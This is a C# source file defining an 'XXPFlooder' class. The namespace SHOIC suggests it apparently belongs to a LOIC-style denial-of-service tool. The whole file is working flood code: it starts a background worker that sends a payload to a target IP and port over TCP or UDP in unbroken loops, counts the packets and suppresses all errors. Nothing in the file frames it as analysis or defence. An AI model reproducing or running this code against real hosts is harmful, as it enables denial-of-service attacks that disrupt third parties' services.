﻿
#region [Usings]
using System.ComponentModel;
using System.Net.Sockets;

#endregion [Usings]

namespace SHOIC
{
	class XXPFlooder : IFlooder
	{ 
		#region Constructors
		public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data)
		{
			this.IP = ip;
			this.Port = port;
			this.Protocol = proto;
			this.Delay = delay;
			this.Resp = resp;
			this.Data = data;
		}
		#endregion

		#region Properties
		public bool IsFlooding { get; set; }

		public int FloodCount { get; set; }

		public string IP { get; set; }

		public int Port { get; set; }

		public int Protocol { get; set; }

		public int Delay { get; set; }

		public bool Resp { get; set; }

		public string Data { get; set; }
		#endregion

		#region Methods
		public void Start()
		{
			IsFlooding = true;
			var bw=new BackgroundWorker();
			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
			bw.RunWorkerAsync();
		
		}
		
		public void Stop()
		{//Ver luego
			//bw+=new Component().Dispose();
		}
		#endregion

		#region Event handlers
		private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				byte[] buf = System.Text.Encoding.ASCII.GetBytes(Data);
				var RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
				while (this.IsFlooding)
				{
					if (Protocol == 1)
					{
						Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp) { Blocking = Resp };
						socket.Connect(RHost);
						try
						{
							while (this.IsFlooding)
							{
								FloodCount++;
								socket.Send(buf);
								if (Delay > 0) System.Threading.Thread.Sleep(Delay);
							}
						}
						catch { }
					}
					if (Protocol == 2)
					{
						Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp) { Blocking = Resp };
						try
						{
							while (this.IsFlooding)
							{
								FloodCount++;
								socket.SendTo(buf, SocketFlags.None, RHost);
								if (Delay > 0) System.Threading.Thread.Sleep(Delay);
							}
						}
						catch { }
					}
				}
			}
			catch { }
		}
		#endregion
	}
}
